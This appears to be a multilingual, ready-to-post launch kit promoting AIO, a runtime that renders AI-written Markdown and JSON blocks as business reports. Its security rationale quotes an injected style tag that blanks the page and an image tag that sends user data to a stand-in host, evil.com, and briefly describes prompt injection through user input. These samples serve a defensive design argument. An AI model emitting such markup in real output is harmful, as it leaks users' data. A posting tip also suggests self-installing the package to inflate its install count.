# AIO v0.4.3 推广包（ready-to-post）

> 写于 2026-05-12。这一份针对 v0.4.x 的当前实际能力（15 组件、30 语言代码高亮、业务报告专项），全部 ready-to-post，复制即可。
>
> 老一版的 `launch-kit.md`/`launch-plan.md` 写于 v0.2.x（4 组件时代），叙事是"AI 写 HTML vs Markdown 之争"。现在 v0.4.x 已经把那场争论的结论实装到了 15 个候选组件 + 30 语言高亮 + 完整商业报告场景里，故事的"问"还没变，"答"已经远远更深，下面这一波文案是更新过的版本。

## 一键关键事实（任何帖子里都可以丢出来）

- **15 个组件**：3 stable（table / metric-cards / callout）+ 12 candidates（chart / trend-card / status-grid / report-header / timeline / action-items / comparison / gauge / funnel / waterfall / heatmap / matrix）
- **30 语言代码高亮**：6 常用内置（json/bash/js+ts/python/yaml/diff）+ 24 lazy-loaded（go/rust/php/ruby/java/...）
- **Frontmatter**：YAML metadata → 自动渲染报告抬头
- **Locale-aware 数字**：`Intl.NumberFormat` 千分位 + 货币 + 百分比
- **打印封面 + 分页**：A4 cover page + H1 page-break，PDF 出片
- **CSV 导出**：每个数据组件头部条 ⤓ 按钮
- **执行摘要自动卡**：扫文档自动提炼 30 秒 takeaway
- **121 KB raw / 28 KB gzipped**
- **Live**: https://wxkingstar.github.io/ai-output-runtime/
- **CDN**: `https://cdn.jsdelivr.net/gh/wxkingstar/ai-output-runtime@v0.4.3/assets/ai-output-runtime.js`
- **Skill**: `npx skills add wxkingstar/ai-output-runtime -g -y`
- **skills.sh**: https://skills.sh/wxkingstar/ai-output-runtime

---

## X / Twitter (English) — 5-post thread

> **Sharpened.** Reveal-by-tweet rhythm (each tweet has its own punch). Tweet 1 = hook, tweet 2 = problem framing, tweet 3 = the move, tweet 4 = receipt (real code), tweet 5 = CTA. **Attach `docs/screenshots/landing-light.png` to tweet 1 and `dashboard-dark.png` to tweet 3** for the image cards.

```
1/5
I gave Claude 15 report components without letting it write a single line of HTML.

It writes Markdown + a few schema-checked JSON blocks. A 28 KB runtime renders them. Result: KPI gauges, P&L bridges, sales funnels, risk matrices — none of which Markdown does — and zero prompt-injection surface.

[image: landing-light.png]
```

```
2/5
The debate that triggered this:

"AI should output HTML"   → can do funnels/charts/layout
                          → but model-emitted <script>/<style>/<iframe> is unsafe.

"AI should output Markdown" → safe.
                            → but can't show a 2×2 risk matrix or a P&L bridge.

Both sides have a point. So I built the third path.
```

```
3/5
The third path:

AI emits Markdown with fenced JSON blocks. The runtime renders them.
The model never touches HTML, CSS, JS, iframes, or event handlers.

v0.4.x ships 15 components covering the shapes business reports actually need:
trend-card, status-grid, timeline, comparison, gauge, funnel, waterfall, heatmap, matrix, action-items.

[image: dashboard-dark.png]
```

```
4/5
A trend-card block is this short:

```aio:trend-card@1
{
  "items": [{
    "label": "GMV",
    "value": 12345678,
    "format": "currency:CNY",
    "delta": { "value": 0.083, "direction": "up", "format": "percent" },
    "spark": [9.1, 9.6, 10.2, 11.1, 10.8, 11.7, 12.3]
  }]
}
```

Renders as ¥12,345,678.00 ▲ 8.3% with a small sparkline. AI fills the JSON. The runtime does the pixels.
```

```
5/5
Open source, MIT. Try the live demo (the page is itself an AIO doc):
https://wxkingstar.github.io/ai-output-runtime/

Install as a Claude Code / Codex / Cursor skill:
npx skills add wxkingstar/ai-output-runtime -g -y

Repo: https://github.com/wxkingstar/ai-output-runtime
```

---

## X / Twitter (Japanese) — 単発高密度

> **Sharpened.** 冒頭を質問形にしてフックを強化。改行を増やして可読性アップ。

```
AI エージェントにレポートを書かせたいけど、HTML はセキュリティ的に怖い、Markdown は表現が貧弱。両方を解決する「第 3 の道」を作りました。

AI は Markdown + JSON ブロックだけ書く。28KB のランタイムが描画。HTML/CSS/JS は一切書かせません。

v0.4 で揃ったもの：
✅ 15 コンポーネント（チャート / KPI ゲージ / ファネル / P&L ウォーターフォール / ヒートマップ / 2×2 行列 / タイムライン / アクション項目 …）
✅ 30 言語のシンタックスハイライト（遅延ロード）
✅ YAML frontmatter で自動レポートヘッダ
✅ Locale 対応の数値フォーマット
✅ 印刷時に表紙ページ + H1 ページブレイク

MIT・OSS：
https://github.com/wxkingstar/ai-output-runtime
Demo: https://wxkingstar.github.io/ai-output-runtime/
Claude Code / Codex / Cursor 用：
npx skills add wxkingstar/ai-output-runtime -g -y
```

---

## X / Weibo / 即刻 — 中文短帖

> **Sharpened.** 第一句改成钩子问题；中部按"问→答→证→招呼"四段切；用 emoji 替换 ✅ list 让结构更紧凑。**配 `docs/screenshots/weekly-dark.png` 或 `dashboard-dark.png`**。

```
让 AI 写业务报告，怎么解？

让它写 HTML 不安全（prompt 一注入 <style>整页消失）；
让它写 Markdown 不够（漏斗、KPI 仪表、P&L 桥 Markdown 表达不出来）。

我做了第三条路：AI 只写 Markdown + JSON 数据块，28KB 浏览器 runtime 安全渲染。AI 一行 HTML/CSS/JS 都不写。

v0.4 现在能干的事：

📊 15 个组件覆盖周报/月报/复盘/Postmortem/KPI/OKR/销售漏斗/财务 P&L/仓储热力/风险矩阵
🌈 代码块自动高亮 30 种语言（按需 lazy-load）
🔢 数字默认千分位 + 货币 + 百分比，自动按语言切换
🖨️ 打印自动出封面，每个 H1 分页，可导 PDF
📥 每个数据组件一键导 CSV

装到 Claude Code / Codex / Cursor：
npx skills add wxkingstar/ai-output-runtime -g -y

Demo（页面本身就是用 AIO 写的）：
https://wxkingstar.github.io/ai-output-runtime/

GitHub（MIT）：
https://github.com/wxkingstar/ai-output-runtime
```

---

## Hacker News — Show HN

> **Sharpened.** Title candidates A/B/C ranked, body restructured around "the debate, both wrong → here's the third path", concrete data-block example in the body, sharper feedback ask. Posting-timing notes below.

**Title — candidates ranked:**

1. **(recommended)** `Show HN: AIO – a Markdown contract for AI reports (charts, funnels, no HTML)` *(75 chars)*
2. `Show HN: 28KB runtime that turns AI-emitted JSON into business reports` *(70 chars)*
3. `Show HN: I gave Claude 15 report components without letting it write HTML` *(73 chars)*

#1 leads with the protocol noun ("Markdown contract"), names concrete components reads will care about ("charts, funnels"), and ends on the safety wedge. #2 is more numeric/hooky. #3 is more storytelling, slightly riskier (HN sometimes downvotes "I + first person + AI" titles).

**Body:**

```
There was a long thread a while back about whether AI should output HTML or
Markdown for reports. Both sides had a point.

  HTML party: Markdown can't show a funnel, a 2x2 risk matrix, a P&L bridge,
              a KPI gauge. You need real layout.
  Markdown party: HTML from a language model is unsafe — prompted styles,
              injected event handlers, third-party iframes. Pick something
              you can audit byte-for-byte.

AIO is the third path. The AI writes Markdown with a small set of fenced JSON
blocks. A 28 KB browser runtime renders them. The model literally never writes
HTML, CSS, JS, iframes, or event handlers — string fields reject `<` and `>`,
blocks must parse as JSON, every field is schema-checked twice (Node CLI for
authoring, runtime for rendering).

A trend-card block from the weekly-report demo:

    ```aio:trend-card@1
    {
      "items": [
        {
          "label": "GMV",
          "value": 12345678,
          "format": "currency:CNY",
          "delta": { "value": 0.083, "format": "percent", "direction": "up" },
          "spark": [9.1, 9.6, 10.2, 11.1, 10.8, 11.7, 12.3],
          "tone": "good"
        }
      ]
    }
    ```

The runtime renders a metric card with ¥12,345,678.00, an upward green ▲ 8.3%
chip, and a small sparkline. The AI never types HTML.

v0.4.3 ships 15 components covering the business-report shapes I kept running
into:

* "what's the number?" → metric-cards, trend-card (with Δ + sparkline)
* "what's red?" → status-grid, callout
* "what changed?" → waterfall (P&L bridge), comparison matrix
* "how does it convert?" → funnel
* "are we hitting target?" → gauge (KPI/OKR semicircle)
* "where's the heat?" → heatmap (2D density)
* "what's the priority?" → matrix (2x2 quadrant)
* "what happened?" → timeline, action-items (with owner/due/priority)
* "header & sign-off" → report-header (auto-emitted from YAML frontmatter),
  callout

Plus 30 syntax-highlight language modules (6 inlined, 24 lazy-loaded from
jsDelivr — first time a language is used, the browser fetches its ~1-2 KB
module).

Three things that surprised me building it:

1. The contract really is small enough to memorize. 15 components fit on
   a half page of SKILL.md and the AI gets it on first try.

2. The locale-aware number formatting (`Intl.NumberFormat`) was the single
   highest-impact UX change. "13620" rendered as "13,620" is the difference
   between "data dump" and "report".

3. Print-to-PDF is unironically good. @page A4 + cover-page page-break-after
   on the report header + `page-break-before: always` on H1s gets you a
   stakeholder-emailable artifact for free.

Try the live demo — the page is itself an AIO document; click "View source"
in the top bar to see the Markdown that produced it:

  https://wxkingstar.github.io/ai-output-runtime/

Two longer demos:

  https://wxkingstar.github.io/ai-output-runtime/demo-weekly.html (weekly review)
  https://wxkingstar.github.io/ai-output-runtime/demo-dashboard.html (Q1 review)

Repo (MIT): https://github.com/wxkingstar/ai-output-runtime

Installs into Claude Code, Codex, Cursor, and ~50 other agents via:

  npx skills add wxkingstar/ai-output-runtime -g -y

Three specific things I'd love feedback on:

1. **Which report shape doesn't fit any of the 15 components.** I think
   waterfall/funnel/matrix cover 80% of what I needed in production, but I
   know I have blind spots. If you ship reports from an agent and a shape is
   missing, tell me which one and what data you have.

2. **Does the skill's description over-fire?** The trigger vocabulary is broad
   (weekly/monthly/dashboard/postmortem/audit/KPI/OKR/funnel/waterfall/heatmap/
   matrix/...). If you try this and the skill activates when you didn't want
   it to, that's the most useful data I can get.

3. **Print/PDF rendering edge cases.** A4 / Letter / Legal? Two-column? RTL?
   If you hit a layout problem when actually trying to email a printed report,
   please open an issue with the screenshot — I optimized for the cases I
   could test (zh-CN A4 dark mode → print) and there are definitely gaps.

(Also: the runtime is one file, 121 KB raw / 28 KB gzipped, no deps. The
schema for each component is in `schemas/*.schema.json`. The CLI is in
`scripts/aio.mjs`. The whole thing is browseable in under an hour.)
```

**Posting-timing notes:**

- HN front-page algo prefers fresh posts ≥ 5 upvotes in the first 30 min. Don't post and walk away.
- Best windows for Show HN (PT): Tue/Wed/Thu 7-10am. Tuesday is safest. Avoid Fri-Sun.
- Don't bother on a US holiday week (esp. US Thanksgiving / Christmas Eve / July 4).
- After posting: don't reply to comments for the first 15 min (let the post float). Then engage every comment in the first 4h, polite + specific.
- OG image: `wxkingstar.github.io/ai-output-runtime/` should serve a good preview. If not, the HN card looks empty.
- Have `docs/screenshots/landing-light.png` ready to attach if a sub-comment asks "what does it look like".

---

## Reddit r/ClaudeCode — fresh post

> **Sharpened.** Title candidates ranked, body restructured for r/ClaudeCode audience (assume they remember the HTML-vs-Markdown thread), specific code example, three concrete asks.

**Title — candidates ranked:**

1. **(recommended)** `v0.4.3: a Markdown contract that gives Claude 15 report components without HTML` *(89 chars — fits Reddit's 300-char title limit)*
2. `Six months later: the third path between "AI writes HTML" and "AI writes Markdown"` *(85 chars — narrative-led)*
3. `I built an agent skill so Claude can ship business reports without writing HTML` *(79 chars — outcome-led)*

#1 is the most concrete and the title r/ClaudeCode subscribers will scan and stop on. #2 references the old debate (works if it's still in fresh memory). #3 is safest but blandest.

**Body:**

```
A while back there was a long thread here about whether Claude should output
HTML or Markdown for reports. I built a third path — let Claude emit
**Markdown with a small set of fenced JSON blocks**, and a 28 KB browser
runtime renders the blocks. Claude literally never writes HTML, CSS, JS,
event handlers, or `<style>`/`<script>`/`<iframe>` — the schema rejects
`<` and `>` in every string field.

I just shipped v0.4.3 and figured I owed an update to this sub specifically,
since that thread is what kicked it off.

**What you can ask Claude to make:**

| Ask | Component(s) |
|-----|--------------|
| Weekly / monthly / quarterly review | `report-header` + `trend-card` + `status-grid` + `timeline` + `action-items` |
| Postmortem / incident timeline | `timeline` + `action-items` + `callout` |
| KPI / OKR scorecard | `gauge` (semicircle, auto-tone from progress vs target) |
| P&L bridge / variance | `waterfall` (start/up/down/subtotal/end) |
| Sales / signup funnel | `funnel` (auto step% + overall%) |
| Inventory / logistics heatmap | `heatmap` (2D, up to 32×32) |
| Risk matrix / RICE / BCG | `matrix` (2×2 quadrant) |
| Vendor / option comparison | `comparison` (multi-criteria + recommended column) |

15 components total (3 stable + 12 candidates). 30 syntax-highlight languages
in code blocks (6 inlined, 24 lazy-loaded — 28 KB runtime supports them all).

**A trend-card looks like this in the Markdown Claude emits:**

    ```aio:trend-card@1
    {
      "items": [{
        "label": "GMV",
        "value": 12345678,
        "format": "currency:CNY",
        "delta": { "value": 0.083, "format": "percent", "direction": "up" },
        "spark": [9.1, 9.6, 10.2, 11.1, 10.8, 11.7, 12.3],
        "tone": "good"
      }]
    }
    ```

The runtime renders a metric card with ¥12,345,678.00, an upward ▲ 8.3% chip,
and a small SVG sparkline. The model emits data; the runtime renders pixels.

**Reader-facing UX**

- Executive Summary card auto-built from the first callout + first metric block (10-second exec view).
- Locale-aware number formatting (千分位, currency, percent — all default; no `format: number` needed).
- Sticky TOC with active-section highlight on screens ≥ 1200px.
- Print-to-PDF: report-header becomes a cover page, each H1 forces a page break.
- CSV export button on every data component.

**Skill install (drops into Claude Code, Codex, Cursor, ~50 others):**

```bash
npx skills add wxkingstar/ai-output-runtime -g -y
```

Once installed, Claude routes to it when you say things like *"out a Q1
review"* / *"复盘上周的事故"* / *"build a sales funnel for last month"* /
*"评估一下风险"*. The trigger vocabulary covers the common business-report
verbs in EN/CN/JA.

**Try it**

- Live demo (the page is itself an AIO doc — click *View source* to see the Markdown): https://wxkingstar.github.io/ai-output-runtime/
- Weekly review demo: https://wxkingstar.github.io/ai-output-runtime/demo-weekly.html
- Q1 dashboard demo: https://wxkingstar.github.io/ai-output-runtime/demo-dashboard.html

**Repo (MIT):** https://github.com/wxkingstar/ai-output-runtime

**Three asks for this sub specifically:**

1. **Which business-report shape doesn't fit any of the 15 components?**
   waterfall/funnel/matrix cover most of what I needed in production but
   I know I have blind spots. If you ship reports from Claude and the
   shape is missing, tell me what data you have.

2. **Does the skill over-fire or under-fire?** The trigger description
   was just broadened in v0.4.2 — if Claude activates AIO when you wanted
   prose (or vice versa), that's the most useful data point I can get.

3. **For folks using Claude in production reports:** the biggest pain
   point you've hit. I keep guessing at this and want real signal.

(Also happy to take pull requests. The whole runtime is one file you can
read in an hour: `assets/ai-output-runtime.js`.)
```

---

## 知乎长帖（1500 字左右）

> **Sharpened.** 改成"承诺→证据→可触达"结构。开篇 3 行钩子，正文每段一个具体可点击的链接/可复制的代码块，结尾 4 条"你能带走的东西"。配 2 张截图。

**标题**（任选）：
1. **（推荐）** `让 AI 写业务报告但不让它写 HTML：v0.4 的「数据契约」实战`
2. `半年前 r/ClaudeCode 上那场争论，我做了第三条路 — AIO v0.4 复盘`
3. `15 个组件搞定 80% 业务报告：我让 Claude/Codex 安全产出周月报的方式`

**配图建议**：
- 头图：`docs/screenshots/weekly-dark.png`（周报全貌）
- 中段：`docs/screenshots/dashboard-dark.png`（Q1 dashboard，含 gauge/funnel/waterfall/heatmap/matrix）

**正文**：

```markdown
半年前 r/ClaudeCode 上吵过一阵：让 AI 写业务报告，应该输出 **HTML 还是
Markdown**？

HTML 派说：图表、对比矩阵、布局、KPI 仪表，Markdown 表达不出来。
Markdown 派说：HTML 不安全，模型可能写出带 prompt injection 的
`<style>`、`<script>`、`<iframe>`。

两边都对。但都没说出第三条路：**让 AI 只输出"数据"，让一份小小的
runtime 把数据安全地变成 HTML**。

我把这条路做出来了——AI Output Runtime（AIO），最新 v0.4.3。这篇说说
它能干什么、为什么这么设计、以及怎么用。读完你可以带走的东西：

1. 一个能直接拿去用的 28 KB 浏览器 runtime（CDN 直引）。
2. 一份 15 个组件的"业务报告组件库"，能让 Claude/Codex 给你出周报、
   月报、复盘、KPI、P&L、销售漏斗、风险矩阵这些。
3. 一种思路：把"AI 能干什么"和"AI 不能干什么"分得很开，写在 schema 里。
4. 一个直接装到 Claude Code / Codex / Cursor 的 agent skill。

---

## 一个最小例子

AI 在 Markdown 里写这样一段（注意 info string 是 `aio:name@major`，
body 是合法 JSON）：

    ```aio:trend-card@1
    {
      "items": [{
        "label": "GMV",
        "value": 12345678,
        "format": "currency:CNY",
        "delta": { "value": 0.083, "format": "percent", "direction": "up" },
        "spark": [9.1, 9.6, 10.2, 11.1, 10.8, 11.7, 12.3],
        "tone": "good"
      }]
    }
    ```

浏览器载入 runtime（一个 `<script>` 标签）后，这段 JSON 被渲染成：

> **GMV**
> **¥12,345,678.00**　▲ 8.3% (vs 上周)
> 📈 内嵌一条小 sparkline

AI 没写任何 HTML/CSS/JS，runtime 负责所有的视觉。

## 为什么不让 AI 直接写 HTML

直接生成的两个真实风险：

- **prompt injection**：用户输入里藏一句 `<style>body{display:none}</style>`，
  AI 一并贴进 report 里，整页消失。
- **第三方 fetch**：AI 引一个 `<img src="https://evil.com/x.png?...">`，
  把用户数据通过 referer/url 偷出去。

AIO 的做法是在 schema 层把这些路径全堵死：

- 任何 string 字段不允许 `<` 或 `>`（runtime + CLI 双重校验）。
- block 必须是合法 JSON（注释、trailing comma 都拒）。
- 组件名必须是 registry 里登记过的（`aio:xxx@1` 没被注册的整块降级为
  可见的 JSON 错误，不爆 XSS）。
- runtime 自己没有 `fetch` 调用；唯一的网络请求是按需加载代码块语法
  高亮的 lang 模块（URL 白名单：`https://cdn.jsdelivr.net/gh/wxkingstar/...`）。

## v0.4.x 的 15 个组件，对应业务场景

| 你要做的报告 | 用哪些组件 |
|---|---|
| 周报 / 月报 / 季报 / 业务汇报 | `report-header` + `trend-card` + `status-grid` + `timeline` + `action-items` |
| Postmortem / 事故复盘 | `timeline` + `action-items` + `callout` |
| KPI / OKR 达成度看板 | `gauge`（半圆仪表，按达成度自动着色） |
| 财务 P&L 桥 / 经营变动归因 | `waterfall`（start / up / down / subtotal / end） |
| 销售转化漏斗 / 注册激活分析 | `funnel`（自动算环比 + 累计转化率） |
| 运营时段 / 仓储热力 / 区域品类 | `heatmap`（最大 32×32 的二维网格） |
| 风险评估 / RICE / BCG 优先级 | `matrix`（2×2 象限散点） |
| 方案选型 / 竞品比较 / Vendor 评分 | `comparison`（多选项 × 多维度，可标推荐列） |
| 静态数据 / 多服务状态 | `metric-cards` / `status-grid` / `table` |
| 结论 / 风险预警 / 推荐 | `callout`（info / success / warning / danger） |

每个组件都有自己的 schema，CLI 在校验时同时检查跨字段不变量
（比如 funnel 的 stage value 必须单调非增，matrix 的 item 坐标
必须在 `[xMin, xMax] × [yMin, yMax]` 内，waterfall 第一根柱必须是
`kind: "start"`）。

## 代码块同时也能高亮，30 种语言

不只是数据组件——AI 写代码块也能拿到漂亮高亮。**6 个内置**（json /
bash / js+ts / python / yaml / diff），24 个 **lazy-load**（go / rust /
php / ruby / java / kotlin / swift / c / cpp / csharp / sql / html / css /
xml / dockerfile / toml / ini / lua / perl / r / scala / dart / regex /
graphql）。

runtime 主文件只有 28 KB gzipped。第一次有人在你的报告里用 `rust`
语言，浏览器从 jsDelivr 拉 `lang/rust.js`（约 1.1 KB）再 in-place
重新渲染那块代码。

## Reader-facing 体验，不是"裸 markdown 凑活"

v0.4.x 加的几个对人最有感的东西：

- **自动 Executive Summary 卡**：扫文档自动抽取首个 callout + 首个
  trend-card，生成一张 10 秒看懂的折叠摘要卡，挂在 report-header 后面。
- **数字千分位 + locale 货币**：默认走 `Intl.NumberFormat`，根据文档
  `lang` 自动选格式。`12345678` 在 zh-CN 渲染为 `12,345,678`，在
  `currency:CNY` 下变成 `¥12,345,678.00`，在 `currency:JPY` 下变成
  `￥12,345,678`。
- **Sticky TOC + 当前章节高亮**：≥1200px 的屏右栏粘住，IntersectionObserver
  标红当前章节。
- **章节锚点**：hover h1/h2/h3 出 `#` 图标，点击复制章节链接到剪贴板。
- **打印封面 + H1 分页**：`@page` A4，report-header 自动变封面页，
  每个 H1 强制分页。`Cmd+P` → "Save as PDF" 就是一份可发邮件的报告。
- **CSV 一键导出**：table/chart/heatmap/funnel/waterfall/trend-card/
  comparison/gauge 头部条都有 `⤓ CSV` 按钮，分析师朋友能直接拿原始数据。

## 装到 Claude Code / Codex / Cursor

```bash
npx skills add wxkingstar/ai-output-runtime -g -y
```

之后 Claude Code 看到你说**"出一份月报"** / **"Q1 OKR 复盘"** /
**"做个销售漏斗"** / **"评估一下风险"** 会自动激活这个 skill，按 AIO
契约输出。skill 的描述里中英双语触发词覆盖了 50+ 个业务报告场景。

## 在线 demo（**这个 demo 页本身就是一份 AIO 文档**）

主页：https://wxkingstar.github.io/ai-output-runtime/
（点顶栏的"查看源稿"能看到生成它的原始 Markdown，非常直观）

两个完整业务 demo：

- 周报：https://wxkingstar.github.io/ai-output-runtime/demo-weekly.html
- Q1 Dashboard：https://wxkingstar.github.io/ai-output-runtime/demo-dashboard.html

## 这个项目刻意不做的事

- **不重新发明可视化**：就 line/bar/area/pie/donut + 5 个商业图表。
  复杂的让 ECharts/D3 上，AIO 留在"5 分钟产出一份能看的报告"这条线。
- **不渲染富文本 HTML**：字段只接 plain text + 一小段受限 Markdown 内联
  （加粗/斜体/inline code/链接），HTML 标签一律拒。
- **不留任何 prompt injection 通道**：style、script、event handler、
  template expression、custom component 全部 schema 禁。

## 我踩过的坑（你可以避开）

1. **第一版数字默认 raw 输出**——`12800000` 看着像编号不像金额。v0.4.3
   改成默认千分位后，被人评论"这才像报告"。
2. **第一版漏斗的 value 写在 bar 里面**——bar 一旦 < 1% 数字就被吃掉。
   改成永远显示在 bar 右侧外。教训：数据可视化里"小柱体"是边界 case。
3. **第一版 SKILL.md 的 description 只列了 4 个组件**——加完 11 个新
   组件后路由器还在按老描述触发，AI 不会主动用新组件。v0.4.2 把
   description 扩到 50+ 触发词才修正。

## 仓库 & 反馈

GitHub（MIT）：https://github.com/wxkingstar/ai-output-runtime
skills.sh listing：https://skills.sh/wxkingstar/ai-output-runtime

最想听的反馈：

- 你的业务报告里有哪种形态，AIO 这 15 个组件没覆盖到？
- 把这个 skill 装到 Claude 后，让它出报告时哪里"违反直觉"？
- 用 Claude 做 stakeholder 报告你最大的痛点是什么？

issues 区见。
```

---

## 掘金（中文技术长文）

> 比知乎更技术，更多代码块和 API 例子；少一点叙事，多一点"动手做"。

**标题**：
```
v0.4：让 AI 写业务报告但不让它写 HTML — AI Output Runtime 实战
```

**正文与知乎版差异**：
- 开篇直接进契约示例（少叙事）。
- 多加 1-2 个完整组件示例（funnel + waterfall）。
- 多一段"代码块同时也能高亮 30 种语言"具体演示。
- 末尾加"想 fork 二次开发？runtime 是单文件，逐段读"的 onboarding。

正文模板（在知乎版基础上微调）：

```markdown
（先 1 段 hook 段——同知乎开头，但缩到 50 字以内）

## 一个 funnel 例子

    ```aio:funnel@1
    {
      "title": "Q1 销售漏斗",
      "stages": [
        { "label": "曝光", "value": 12800000 },
        { "label": "点击", "value": 1840000 },
        { "label": "加购", "value": 320000 },
        { "label": "下单", "value": 4500 },
        { "label": "支付完成", "value": 60 }
      ]
    }
    ```

CLI 校验通过后（`node scripts/aio.mjs validate file.md`），浏览器 runtime
渲染成 5 条水平条 + 自动算每段环比和累计转化率：
环比 14.4% / 17.4% / 1.4% / 1.3%，累计 100% / 14.4% / 2.5% / 0.04% / 0.0005%。

## 一个 waterfall（P&L 桥）例子

    ```aio:waterfall@1
    {
      "title": "Q1 P&L Bridge",
      "format": "currency:CNY",
      "bars": [
        { "label": "Revenue", "value": 420000000, "kind": "start" },
        { "label": "COGS",    "value": -260000000, "kind": "down" },
        { "label": "Gross",   "value":  160000000, "kind": "subtotal" },
        { "label": "OpEx",    "value":  -88000000, "kind": "down" },
        { "label": "Net",     "value":   72000000, "kind": "end" }
      ]
    }
    ```

5 根柱：start 蓝、down 红、subtotal 蓝、down 红、end 蓝，柱间虚线连
表示累计。schema 强制：第一根必须是 `start`，up/down 在前一根的
cumulative 上叠加，subtotal/end 重置到 0 基线。

（剩下复用知乎版"15 个组件 / 30 语言 / Reader UX / 装 skill / demo /
踩过的坑 / 仓库"几段，技术语气调严一点。）
```

---

## Qiita（日本語長文）

**タイトル**:
```
AI に HTML を書かせずにレポートを書かせる：AI Output Runtime v0.4 実装メモ
```

**本文**:

```markdown
半年前、r/ClaudeCode と X で長い議論がありました：「AI にレポートを書かせるなら、
HTML を出力させるべきか、Markdown だけにすべきか」。

両方とも一理あります：

- **HTML 派**：チャート、KPI ゲージ、ファネル、2×2 リスク行列 — Markdown では
  表現できない。
- **Markdown 派**：HTML は危険。プロンプト注入で `<style>`、`<script>`、
  `<iframe>` が混入したら終わり。

僕は第 3 の道を実装しました：**AI には「データ」だけ書かせて、小さなランタイムが
それを安全に HTML に変換する**。

このプロジェクトを AI Output Runtime（AIO）と呼んでいます。最新版は v0.4.3 です。

## 契約の最小例

AI が Markdown 内に書く fenced code block：

    ```aio:trend-card@1
    {
      "items": [{
        "label": "GMV",
        "value": 12345678,
        "format": "currency:JPY",
        "delta": { "value": 0.083, "format": "percent", "direction": "up" },
        "spark": [9.1, 9.6, 10.2, 11.1, 10.8, 11.7, 12.3],
        "tone": "good"
      }]
    }
    ```

ブラウザは 28 KB のランタイム（CDN から `<script>` 一行）を読み込み、この JSON を：

> **GMV**　￥12,345,678　▲ 8.3%（前週比）
> 📈 sparkline 付き

として描画します。AI は HTML/CSS/JS を一切書きません。

## v0.4 の 15 コンポーネント、業務レポート全カバー

| 何のレポート | どのコンポーネント |
|---|---|
| 週報 / 月報 / 四半期レビュー | `report-header` + `trend-card` + `status-grid` + `timeline` + `action-items` |
| ポストモーテム / インシデント振り返り | `timeline` + `action-items` + `callout` |
| KPI / OKR 達成率ダッシュボード | `gauge`（半円メーター、進捗で自動着色） |
| 損益計算書（P&L）ブリッジ | `waterfall`（start / up / down / subtotal / end） |
| 売上ファネル / 登録活性化分析 | `funnel`（自動でステップ % + 累計 %） |
| 時間帯ヒートマップ / 在庫回転 | `heatmap`（最大 32×32 グリッド） |
| リスク評価 / RICE / BCG 優先順位 | `matrix`（2×2 散布図） |
| 案件選定 / 競合比較 | `comparison`（複数選択肢 × 複数評価軸） |
| 最終判断 / 推奨 / 警告 | `callout` |

各コンポーネントには独立した JSON Schema があり、CLI 側で
クロスフィールド不変条件（funnel の単調非増加、matrix 座標境界、
waterfall の `start` 必須など）を強制します。

## セキュリティ境界

- すべての string フィールドは `<` と `>` を拒否（ランタイム + CLI 二重チェック）
- block は valid JSON 必須（コメント、trailing comma 拒否）
- 未登録のコンポーネント名は可視 JSON エラーにフォールバック（XSS にならない）
- ランタイム本体に `fetch` 呼び出しなし。唯一のネットワーク要求はコードハイライト
  用の lang/*.js 遅延ロード（URL ホワイトリスト：`https://cdn.jsdelivr.net/gh/...`）

## コードブロックハイライトも内蔵、30 言語

6 言語インライン（json / bash / js+ts / python / yaml / diff）+ 24 言語遅延ロード
（go / rust / php / ruby / java / kotlin / swift / c / cpp / csharp / sql / html /
css / xml / dockerfile / toml / ini / lua / perl / r / scala / dart / regex /
graphql）。ランタイム本体は 28 KB gzipped のまま。

## Reader UX（v0.4.x で重要だった追加）

- **自動エグゼクティブサマリーカード**：最初の callout と最初の trend-card を
  抽出して、レポート先頭に 10 秒で読める折りたたみカードを挿入
- **Locale 対応の数値フォーマット**：`Intl.NumberFormat` で千区切り / 通貨 /
  パーセンテージを自動切り替え（zh-CN / en / ja）
- **Sticky TOC + アクティブセクション強調**：1200px 以上の画面で右側に固定
- **印刷時の表紙ページ**：`@page` A4 + report-header が表紙化、H1 ごとに改ページ
- **CSV エクスポート**：全てのデータコンポーネントに ⤓ ボタン

## Claude Code / Codex / Cursor へのインストール

```bash
npx skills add wxkingstar/ai-output-runtime -g -y
```

インストール後、「週報を書いて」「Q1 OKR 振り返り」「営業ファネルを作って」
などの自然な依頼で自動的にスキルが起動します。

## ライブデモ

このデモページ自体が AIO ドキュメントです（上部の「View source」をクリックすると
生成元の Markdown が見えます）：

https://wxkingstar.github.io/ai-output-runtime/

業務レポートのフルデモ：

- 週報: https://wxkingstar.github.io/ai-output-runtime/demo-weekly.html
- Q1 ダッシュボード: https://wxkingstar.github.io/ai-output-runtime/demo-dashboard.html

## 意図的にやらないこと

- **可視化を再発明しない**：line / bar / area / pie / donut + 5 つのビジネス
  チャートのみ。複雑なものは ECharts / D3 に任せる。AIO は「5 分で見せられる
  レポートを出す」線に留まります。
- **リッチテキスト HTML を描画しない**：フィールドは plain text + 限定的な
  Markdown インラインのみ。HTML タグは全て拒否。
- **プロンプト注入経路を一切残さない**：style / script / event handler /
  template expression / custom component すべてスキーマで禁止。

## リポジトリ

GitHub (MIT): https://github.com/wxkingstar/ai-output-runtime
skills.sh listing: https://skills.sh/wxkingstar/ai-output-runtime

フィードバック歓迎：

- 業務レポートで 15 コンポーネントでカバーできない形は？
- スキル発動時に直感に反する挙動があれば
- Claude で本番レポートを書いている方の最大の痛点

issues でお待ちしています。
```

---

## 推广执行顺序建议（按"成本递增"排）

| # | 渠道 | 用时 | 内容 | 备注 |
|---|---|---|---|---|
| 1 | 自己跑 `npx skills add` | 30 秒 | — | 立刻 +1 install，搜索权重提升 |
| 2 | X/微博/即刻 中文短帖 | 2 分钟 | 上面的"中文短帖" | 无需 thread，单帖 |
| 3 | X EN 5-post thread | 5 分钟 | 上面的 EN thread | 重点投手 |
| 4 | r/ClaudeCode 帖 | 10 分钟 | 上面的 Reddit body | 直接目标群体 |
| 5 | HN Show HN | 15 分钟 | 上面的 HN body | 选周二/三 PT 7-9am 投 |
| 6 | 知乎 / 掘金 长帖 | 30 分钟 | 上面的中文长帖（截图替换） | 长尾流量 |
| 7 | Qiita 日文 | 30 分钟 | 改写日文版（之前 launch-kit 里有素材） | 日本社区 |

## 必带 boilerplate

每条帖子末尾建议都带：

```
Demo: https://wxkingstar.github.io/ai-output-runtime/
Repo: https://github.com/wxkingstar/ai-output-runtime
Install: npx skills add wxkingstar/ai-output-runtime -g -y
```

## 截图建议

- `docs/screenshots/` 已有几张老的（v0.2.x）—— 建议重新截一组 v0.4.x 的，
  覆盖 weekly + dashboard demo 两个页面。需要的话告诉我，我可以用 browse
  自动出一组高清截图。

## KPIs 观察

发完后 24-48h 看：
- `skills.sh/wxkingstar/ai-output-runtime` install 数
